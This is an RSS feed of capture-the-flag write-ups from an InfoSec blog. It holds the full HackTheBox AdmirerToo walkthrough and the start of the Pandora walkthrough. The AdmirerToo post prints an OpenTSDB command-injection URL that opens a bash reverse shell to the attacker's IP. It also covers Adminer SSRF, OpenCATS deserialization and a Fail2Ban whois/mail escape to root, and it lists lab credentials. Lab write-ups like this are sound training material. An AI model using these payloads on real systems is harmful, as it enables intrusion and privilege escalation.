<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-05-29T09:51:21+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">AdmirerToo - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" rel="alternate" type="text/html" title="AdmirerToo - HackTheBox" /><published>2022-05-29T00:00:00+01:00</published><updated>2022-05-29T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/admirertoo</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html"><![CDATA[<p><strong>AdmirerToo</strong> is a hard-rated linux box. It starts with an SSRF exploit on <em>Adminer</em> to access an instance of <em>OpenTSDB</em> on port <strong>4242</strong>, which is vulnerable to RCE. This will give you a shell on the box as <code class="language-plaintext highlighter-rouge">opentsdb</code>, which you can use to extract credentials from a configuration file and gain access to the account of <code class="language-plaintext highlighter-rouge">jennifer</code> due to password reuse. An instance of <em>OpenCATS</em> is running locally on port <strong>8080</strong>, which you can access by setting up an SSH tunnel. <em>OpenCATS</em> is running as the user <code class="language-plaintext highlighter-rouge">devel</code>, who has write permissions on the directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, and is vulnerable <em>object injection</em> that you can use to write files in the directory, and exploit the <em>Fail2Ban</em> service to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220212113822.png" alt="" /></p>

<p><img src="/assets/img/20220212113838.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Sat Feb 12 11:41:17 2022 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.137
Increasing send delay for 10.10.11.137 from 0 to 5 due to 192 out of 638 dropped probes since last increase.
Nmap scan report for admirertoo.htb (10.10.11.137)
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp   open     http           Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Admirer
4242/tcp filtered vrml-multi-use
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 12 11:42:38 2022 -- 1 IP address (1 host up) scanned in 80.99 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/20220212114740.png" alt="" /></p>

<p>This is a PHP site due to presence of <code class="language-plaintext highlighter-rouge">/index.php</code>. The chat bubble in the homepage sent a request to the index page, but the request does not seem to be processed by the server as there are no changes in response;</p>

<p><img src="/assets/img/20220212115359.png" alt="" /></p>

<p>Requesting a non-existing page leaked a possible domain;</p>

<p><img src="/assets/img/20220212120040.png" alt="" /></p>

<p>I updated my hosts file with it, and reload the page. Nothing changed.</p>

<p>Fuzzing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code>, I got a hit;</p>

<p><img src="/assets/img/20220212120534.png" alt="" /></p>

<p><br /></p>

<h4 id="dbadmirer-galleryhtb">db.admirer-gallery.htb</h4>
<p><br /></p>

<p><img src="/assets/img/20220212120952.png" alt="" /></p>

<p>Clicking the <em>enter</em> button, I was login to a database management service like <em>phpMyAdmin</em> as the user <strong>admirer_ro</strong>;</p>

<p><img src="/assets/img/20220212121927.png" alt="" /></p>

<p>I have access to the database <strong>gallery</strong>, but I can’t make any changes to it;</p>

<p><img src="/assets/img/20220212122014.png" alt="" /></p>

<p>Going to the <em>privileges</em> menu from the homepage, I was able to read the password hash of the <strong>admirer_ro</strong> user;</p>

<p><img src="/assets/img/20220212123348.png" alt="" /></p>

<p>The password hash could not be cracked using <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, so I moved on.</p>

<p>However, I did not enter any password to login to the service, so I looked through my traffic in burp, and found a password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>;</p>

<p><img src="/assets/img/20220212123541.png" alt="" /></p>

<p>Looking at the source code of the login page, I found even more useful info;</p>

<p><img src="/assets/img/20220212124001.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="adminer">Adminer</h3>
<p><br /></p>

<blockquote>
  <p>Adminer is a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Its author is Jakub Vrána who started to develop this tool as a light-weight alternative to phpMyAdmin, in July 2007.</p>
</blockquote>

<p>The service has support for custom plugins, which are installed in the <code class="language-plaintext highlighter-rouge">/plugins</code> directory;</p>

<p><img src="/assets/img/20220214094555.png" alt="" /></p>

<p>My first attempt at exploiting this service is to get it to authenticate to my own MySQL server, which may let me read local files on the server running <em>adminer</em> into my own database. So I created a database named <code class="language-plaintext highlighter-rouge">admirer</code>, and add a user to it with the username <code class="language-plaintext highlighter-rouge">admirer_ro</code> and password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>.</p>

<p>Using burp’s <em>intercept</em>, I passed all the relevant config to the server;</p>

<p><img src="/assets/img/20220214083419.png" alt="" /></p>

<p>This didn’t work, and the login page displayed an error message;</p>

<p><img src="/assets/img/20220214083631.png" alt="" /></p>

<p>So I repeat the process with a wrong password to see if I can get a different response. I did;</p>

<p><img src="/assets/img/20220214083855.png" alt="" /></p>

<p>This indicate the first login attempt was likely successful. So I fired up <em>Wireshark</em> to see what exactly is going on.</p>

<p>As you can see from the following packets, the box did manage to successfully authenticate to my MySQL database;</p>

<p><img src="/assets/img/20220214084810.png" alt="" /></p>

<p>However, the client exited using the <code class="language-plaintext highlighter-rouge">quit</code> (the last highlighted packet) command after the authentication has been completed. I have no clue why this is happening, may be the service is doing some sort of validation?</p>

<p>Another thing I saw while going through the packets is support for <code class="language-plaintext highlighter-rouge">LOAD DATA LOCAL</code> command by the client, which is a command I could use to read local files on the box should the server allow it;</p>

<p><img src="/assets/img/20220214085622.png" alt="" /></p>

<p>After the MySQL session was closed, my box made a HTTP request to the server, and was given a <strong>403 Forbidden</strong> response;</p>

<p><img src="/assets/img/20220214090602.png" alt="" /></p>

<p>My guess is this is somehow interfering with the web login. The cookies look very interesting, so I started studying them. The cookie <code class="language-plaintext highlighter-rouge">adminer_permanent</code> is a URL-encoded base64-string;</p>

<p><img src="/assets/img/20220214091542.png" alt="" /></p>

<p>The cookie contains the database host, database name, and database username. The cookies <code class="language-plaintext highlighter-rouge">adminer_key</code> and <code class="language-plaintext highlighter-rouge">adminer_sid</code> look interesting, but I have no idea what they are. So I decided to install <em>Adminer</em> locally on my box in hope of learning more about them.</p>

<p>I installed <em>Adminer</em> in a docker container along with a MySQL server, then I configured another MySQL service on my main host. In both databases, I created a database named <code class="language-plaintext highlighter-rouge">admirer</code> and created a user for it named <code class="language-plaintext highlighter-rouge">admirer_ro</code> with the passwords set to <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>. Interestingly, my approach worked locally, and I was able to get the <em>Adminer</em> service in my docker container to connect to the database on my main host. I have no clue why it’s not working on the box, so I just moved on.</p>

<p>Searching for exploits for the version of adminer running, I found this at https://github.com/advisories/GHSA-x5r2-hj5c-8jx6;</p>

<p><img src="/assets/img/20220214154948.png" alt="" /></p>

<p>The version of Adminer running on the host is vulnerable to SSRF. The PoC is in a linked PDF. It links to a python script at https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd, which can be used to setup the redirect.</p>

<p>SSRF flaws are mainly used to access internal resources, or resources we are not allowed to directly access. Going back to my initial port scan, NMAP reported port <strong>4242</strong> as <em>filtered</em>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>---[snip]---
|_http-title: Admirer
4242/tcp filtered vrml-multi-use
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
---[snip]---
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So I setup the redirection script to redirect requests to my box on port <strong>80</strong> to the filtered service at http://127.0.0.1:4242. I then send a login request with the server set to my box and driver set to <em>elastic</em> (for Elasticsearch);</p>

<p><img src="/assets/img/20220214161416.png" alt="" /></p>

<p><img src="/assets/img/20220214161606.png" alt="" /></p>

<p>This worked, and I got a response from the hidden service;</p>

<p><img src="/assets/img/20220214161741.png" alt="" /></p>

<p>It seems the service supports the HTTP protocol. The title <strong>OpenTSDB</strong> looks interesting, so I started googling it;</p>

<blockquote>
  <p><strong>OpenTSDB</strong> is <em>a distributed, scalable Time Series Database</em> (TSDB) written on top of HBase. OpenTSDB was written to address a common need: store, index and serve metrics collected from computer systems (network gear, operating systems, applications) at a large scale, and make this data easily accessible and graphable.</p>
</blockquote>

<p>Seaching for known exploits for this service, I found a <em>Command Injection</em> vulnerability at https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yaml</p>

<p>Using the PoC provided that runs a <code class="language-plaintext highlighter-rouge">wget</code> command, I got a long error message about a missing “metric”;</p>

<p><img src="/assets/img/20220214164802.png" alt="" /></p>

<p>Googling on what exactly a “metric” is in this service, I learned that;</p>

<blockquote>
  <p>In OpenTSDB, a metric is <strong>named with a string</strong>, like http. hits . To be able to store all the different values for all the places where this metric exists, you tag the data with one or more tags when you send them to the TSD. TSD stores the timestamp, the value, and the tags.</p>
</blockquote>

<p>There is a way to list available metrics using the query <code class="language-plaintext highlighter-rouge">/api/suggest?type=metrics</code>. Using it on the host returned one entry <code class="language-plaintext highlighter-rouge">http.stats.web.hits</code>;</p>

<p><img src="/assets/img/20220214165423.png" alt="" /></p>

<p>So I updated the exploit using this metric;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27nc%2010.10.16.53%20443%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And bingo!!!</p>

<p><img src="/assets/img/20220214170430.png" alt="" /></p>

<p>I used this exploit to spawn a shell on the box as <strong>opentsdb</strong> user;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.53%2F443%200%3E%261%22%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220215033044.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Local user with the name <strong>jennifer</strong> exists. The user I am working as is not part of any groups. <code class="language-plaintext highlighter-rouge">linPEAS</code> found some creds;</p>

<p><img src="/assets/img/20220215034950.png" alt="" /></p>

<p>This creds were found in the file <code class="language-plaintext highlighter-rouge">/etc/opencats/config.php</code>. I was able to login to the local MySQL server using it;</p>

<p><img src="/assets/img/20220215035343.png" alt="" /></p>

<p>This user has access to only one database, which contains the below tables;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>+--------------------------------------+
| Tables_in_cats_dev                   |
+--------------------------------------+
---[snip]---
| site                                 |
| sph_counter                          |
| system                               |
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The table <code class="language-plaintext highlighter-rouge">user</code> looks interesting, and was found to contain some hashes;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>MariaDB [cats_dev]&gt; select user_id, email, user_name, password from user;
+---------+-------------------------+----------------+----------------------------------+
| user_id | email                   | user_name      | password                         |
+---------+-------------------------+----------------+----------------------------------+
|       1 | admin@testdomain.com    | admin          | dfa2a420a4e48de6fe481c90e295fe97 |
|    1250 | 0                       | cats@rootadmin | cantlogin                        |
|    1251 | jennifer@admirertoo.htb | jennifer       | f59f297aa82171cc860d76c390ce7f3e |
+---------+-------------------------+----------------+----------------------------------+
3 rows in set (0.001 sec)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I was unable to crack any of the hashes using the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist with <code class="language-plaintext highlighter-rouge">john</code>, so I moved on.</p>

<p>The box doesn’t allow to me to list the processes of other users, only mine;</p>

<p><img src="/assets/img/20220215091250.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">pspy</code> also didn’t help, so we are probably in a jailed environment.</p>

<p>There are a few other ports listening;</p>

<p><img src="/assets/img/20220215091442.png" alt="" /></p>

<p>The service on port <strong>8080</strong> caught my attention. This is a port normally used by web proxies, so I tried to use it with <code class="language-plaintext highlighter-rouge">curl</code> to make a request, but it didn’t work;</p>

<p><img src="/assets/img/20220215093108.png" alt="" /></p>

<p>It keeps closing connections about one second after they were established, even without sending any data.</p>

<p>Looking at the <code class="language-plaintext highlighter-rouge">/opt</code> directory, I saw 2 directories owned by the <code class="language-plaintext highlighter-rouge">root</code> user;</p>

<p><img src="/assets/img/20220215093232.png" alt="" /></p>

<p>A quick search in <code class="language-plaintext highlighter-rouge">searchsploit</code> showed 2 vulns for <em>OpenCATS</em>;</p>

<p><img src="/assets/img/20220215093404.png" alt="" /></p>

<p>This is a <em>free open-source applicant tracking system (ATS).</em>, with documentation at https://opencats-documentation.readthedocs.io/</p>

<p>After further enumeration of the filesystem, the file <code class="language-plaintext highlighter-rouge">/var/www/adminer/plugins/data/server.php</code> was found to contain the configuration of the <em>one-click login</em> plugin installed in Adminer. The file contains a commented-out password, which turns out to be the password of <strong>jennifer</strong>. This was easier than I expected;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">return</span> <span class="p">[</span>
  <span class="s1">'localhost'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
<span class="c1">//    'username' =&gt; 'admirer',</span>
<span class="c1">//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',</span>
<span class="c1">// Read-only account for testing</span>
    <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'admirer_ro'</span><span class="p">,</span>
    <span class="s1">'pass'</span>     <span class="o">=&gt;</span> <span class="s1">'1w4nn4b3adm1r3d2!'</span><span class="p">,</span>
    <span class="s1">'label'</span>    <span class="o">=&gt;</span> <span class="s1">'MySQL'</span><span class="p">,</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
      <span class="s1">'admirer'</span> <span class="o">=&gt;</span> <span class="s1">'Admirer DB'</span><span class="p">,</span>
    <span class="p">)</span>
  <span class="p">),</span>
<span class="p">];</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This password gave me access to the box over SSH as <strong>jennifer</strong>;</p>

<p><img src="/assets/img/20220215094647.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><strong>jennifer</strong> does not have <code class="language-plaintext highlighter-rouge">sudo</code> permissions on the box, and I still cannot list running processes belonging to other users.</p>

<p>Looking for attack vectors, I noticed the modification date of <code class="language-plaintext highlighter-rouge">/usr/bin/pkexec</code> dates back to <strong>15 Jan 2019</strong>. This indicate it may be vulnerable to the <em>pwnkit</em> exploit. Searching for exploits, I found one at https://github.com/ly4k/PwnKit. Testing the exploit on the box, I was elevated to root immediately. This is way too easy for a <strong>hard</strong> box, so I contacted a staff through the HTB discord, and found out it is indeed unintended. So I switched back to <strong>jennifer</strong>, and started looking for the intended way.</p>

<p>Since I now have access to the box over SSH, I can use it to setup tunnels to those local ports, and hopefully identify them using <code class="language-plaintext highlighter-rouge">nmap</code>. After setting up the tunnels, I performed a version scan on the ports;</p>

<p><img src="/assets/img/20220215101505.png" alt="" /></p>

<p>The service on port <strong>8080</strong> was now identified as <em>Apache httpd 2.4.38 ((Debian))</em>. Opening it up in my browser, I got a login page;</p>

<p><img src="/assets/img/20220215101822.png" alt="" /></p>

<p>Testing the credentials I have up to this point for an easy win, I was able to login using the username <code class="language-plaintext highlighter-rouge">jennifer</code> and password <code class="language-plaintext highlighter-rouge">bQ3u7^AxzcB7qAsxE3</code>;</p>

<p><img src="/assets/img/20220215102211.png" alt="" /></p>

<p>The footer showed the version of <strong>OpenCATS</strong> running is <strong>0.9.5.2</strong>. Notice that <em>jennifer</em> has read-only access to the service</p>

<p><br /></p>

<h4 id="opencats">OpenCATS</h4>
<p><br /></p>

<p>With the version of <strong>OpenCATS</strong> now known, I started looking for exploits. The article https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html showed that the service is vulnerable to <em>arbitrary file write</em> due to unsafe PHP object deserialization.</p>

<blockquote>
  <p>OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.</p>
</blockquote>

<p>The request of interest is triggered after hitting any of the below links;</p>

<p><img src="/assets/img/20220215110734.png" alt="" /></p>

<p>This generate a GET request with the parameter <code class="language-plaintext highlighter-rouge">parametersactivity:ActivityDataGrid</code> containing the serialized PHP object;</p>

<p><img src="/assets/img/20220215114134.png" alt="" /></p>

<p>Following the article, I tried to write a file to the root of the web app at <code class="language-plaintext highlighter-rouge">/opt/opencats</code>, but got a <strong>500</strong> error response. This is probably because of permission issues as the web root is owned by the root user.</p>

<p>So I tried to create a file in the globally writable directory <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and it worked;</p>

<p><img src="/assets/img/20220215161307.png" alt="" /></p>

<p><img src="/assets/img/20220215161455.png" alt="" /></p>

<p><img src="/assets/img/20220215161532.png" alt="" /></p>

<p>The file is created as the user <strong>devel</strong>. The user <strong>devel</strong> does not have a login shell, and his home directory does not exist;</p>

<p><img src="/assets/img/20220215161640.png" alt="" /></p>

<p>So I begin to search the filesystem for files and directories this user owns, and found a few;</p>

<p><img src="/assets/img/20220215114845.png" alt="" /></p>

<p><strong>devel</strong> has write permissions on two key directories;</p>

<p><img src="/assets/img/20220215161814.png" alt="" /></p>

<p>Both directories are empty. The directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code> is used by some programs to store and load configuration files. So I started looking for any program I could exploit using this. Listing running services using <code class="language-plaintext highlighter-rouge">systemctl</code> showed that <em>Fail2Ban</em>, which is an IPS-like service that blocks suspicious IPs, is running on the host;</p>

<p><img src="/assets/img/20220215170016.png" alt="" /></p>

<p>Searching for known expoits for this service, I found an article explaining how it could be exploited at https://research.securitum.com/fail2ban-remote-code-execution/</p>

<p>The article explains how data passed to the <code class="language-plaintext highlighter-rouge">mail</code> command without validation can lead to <em>arbitrary code execution</em> using the <code class="language-plaintext highlighter-rouge">~!</code> escape sequence. I was able to test this locally, and it worked. A shell command was executed in my default login shell;</p>

<p><img src="/assets/img/20220215170817.png" alt="" /></p>

<p>Reading further into the article, this paragraph was particularly interesting;</p>

<p><img src="/assets/img/20220215171014.png" alt="" /></p>

<p>When <em>Fail2Ban</em> bans an IP, it sends an email notification to a defined address. The email will contain the result of a <em>whois</em> lookup for the IP address. So if I could control this, I could add a command that will be executed in the result of the whois lookup.</p>

<p>Testing this with a user account that does not have a default shell didn’t work;</p>

<p><img src="/assets/img/20220215172244.png" alt="" /></p>

<p>Changing the escape from <code class="language-plaintext highlighter-rouge">~!</code> to <code class="language-plaintext highlighter-rouge">~|</code> did the trick;</p>

<p><img src="/assets/img/20220215172357.png" alt="" /></p>

<p>Now all I needed to do is create a <em>whois</em> config that will direct all whois lookups to my machine on port <strong>43</strong>. To do this, I need to create a configuration file at <code class="language-plaintext highlighter-rouge">/usr/local/etc/whois.conf</code> that will be used by <code class="language-plaintext highlighter-rouge">whois</code>. I can use the deserialization exploit to do this, but the problem is other data is added to my payload;</p>

<p><img src="/assets/img/20220215173720.png" alt="" /></p>

<p>Note that only the highlighted text is my actual payload. After studying a bit on whois configuration files, I learned that the configurations have to be in <em>regular expression</em>. After lots of trials and errors, I was able to craft a valid <em>whois</em> config file to match my IP address using the payload <code class="language-plaintext highlighter-rouge">"}]|10.10.16.53 [10.10.16.53]</code>;</p>

<p><img src="/assets/img/20220215181115.png" alt="" /></p>

<p>As you can see above, I was able to get <code class="language-plaintext highlighter-rouge">whois</code> to query my own server. Now I have all I need to execute commands on the box.</p>

<p>With the whois configuration file in place, I started a netcat listener on port <strong>43</strong> to send the payload as a whois response;</p>

<p><img src="/assets/img/20220215183213.png" alt="" /></p>

<p>Then I started another listener on port <strong>443</strong> to receive the above reverse shell. Now to trigger the exploit, I need to make <em>Fail2Ban</em>, which is running as root, to ban my IP. This will result in a whois request that will be replied to with my payload. To trigger this ban, I bruteforced the SSH login using <code class="language-plaintext highlighter-rouge">hydra</code>, which made <em>Fail2Ban</em> ban my IP. This resulted in a whois lookup to my box;</p>

<p><img src="/assets/img/20220215183555.png" alt="" /></p>

<p>The request hangs however, and I had to press <code class="language-plaintext highlighter-rouge">CTRL + C</code> to exit. After closing the fake whois server, my payload was executed, and I got a shell in the box as root;</p>

<p><img src="/assets/img/20220215183848.png" alt="" /></p>

<p>This is the <em>hard</em> box I managed to solve, and even though it took some nudges, I was very happy!!!</p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, <strong>80</strong>, and <strong>4242</strong> (filtered) with <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found a subdomain <code class="language-plaintext highlighter-rouge">db.admirer-galley.htb</code>  running an instance of <em>Adminer</em>.</li>
  <li>Exploited an <em>SSRF</em> flaw in <em>Adminer</em> to access the service on port <strong>4242</strong>.</li>
  <li>Service on port <strong>4242</strong> (OpenTSDB) was found to be vulnerable to <strong>RCE</strong>, which gave me access to the box as the local user <strong>opentsdb</strong>.</li>
  <li>Inside as <strong>opentsdb</strong>
    <ul>
      <li>Recovered a password in the configuration file of the one-click login plugin used by Adminer.</li>
      <li>Gained access to the account of <strong>jennifer</strong> due to password reuse.</li>
    </ul>
  </li>
  <li>Inside as <strong>jennifer</strong>
    <ul>
      <li>Setup a tunnel to an instance of <em>OpenCATS</em> running locally on port <strong>8080</strong>, and logged in as <strong>jennifer</strong>.</li>
      <li>Exploited a PHP deserialization flaw to create files on the server as the user <strong>devel</strong>.</li>
      <li><strong>devel</strong> has write access to <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, which I exploited to create <code class="language-plaintext highlighter-rouge">whois</code> config that queries my server.</li>
      <li>Exploited the way <em>Fail2Ban</em> is calling <code class="language-plaintext highlighter-rouge">mail</code> with the output of whois lookups to gain code execution as <strong>root</strong>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="adminer" /><category term="mysql" /><category term="php" /><category term="ssrf" /><category term="opentsdb" /><category term="rce" /><category term="opencats" /><category term="fail2ban" /><category term="whois" /><category term="object injection" /><category term="insecure deserialization" /><category term="phpggc" /><summary type="html"><![CDATA[AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root.]]></summary></entry><entry><title type="html">Pandora - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/pandora.html" rel="alternate" type="text/html" title="Pandora - HackTheBox" /><published>2022-05-21T00:00:00+01:00</published><updated>2022-05-21T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/pandora</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/pandora.html"><![CDATA[<p><strong>Pandora</strong> is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port <strong>161</strong> (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through <em>path tampering</em> to gain code execution as root.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20220208055528.png" alt="" /></p>

<p><img src="/assets/img/20220208055557.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Fri Jan 28 14:55:17 2022 as: nmap -sS -sV -v -oN nmap.txt 10.10.11.136
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 28 14:59:09 2022 -- 1 IP address (1 host up) scanned in 232.39 seconds
</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20220208060055.png" alt="" /></p>

<p>The site has a contact-us form that does generate a request, but the response, which just returns the homepage of the site, does not change no matter what I did to the parameters;</p>

<p><img src="/assets/img/20220208060341.png" alt="" /></p>

<p>Bruteforcing the web root for hidden files, and also for hidden subdomains didn’t give me anything of use. A quick UDP port scan with NMAP showed port <strong>161</strong> (SNMP) is open. So I scanned it deeper with <code class="language-plaintext highlighter-rouge">-sU -sC -sV</code> flags, and found a credential <code class="language-plaintext highlighter-rouge">daniel</code>:<code class="language-plaintext highlighter-rouge">HotelBabylon23</code> that is being passed to a script as command line argument;</p>

<p><img src="/assets/img/20220208061826.png" alt="" /></p>

<p>The script that did this enumeration is <code class="language-plaintext highlighter-rouge">snmp-processes</code>, which is used to discover running processes on a host running SNMP. Using the credential, I was able to get access to the box over SSH;</p>

<p><img src="/assets/img/20220208062306.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<h4 id="pandorapandahtb">pandora.panda.htb</h4>

<p>After poking around a little inside the box, the apache configuration file at <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-available/pandora.conf</code> showed a hidden subdomain;</p>

<p><img src="/assets/img/20220208063020.png" alt="" /></p>

<p>I added the hostname to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, but was unable to access it as on request the server simply returns that static web page at <code class="language-plaintext highlighter-rouge">pandora.htb/</code>. Notice in the first line of the Apache2 config that the hostname for the virtual host is <strong>localhost</strong>. This means the domain is accessible only locally. So with my SSH access into the box, I setup an SSH tunnel so I can access the site over port <strong>8888</strong> on my attack host;</p>

<p><img src="/assets/img/20220209212210.png" alt="" /></p>

<p>Then I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>

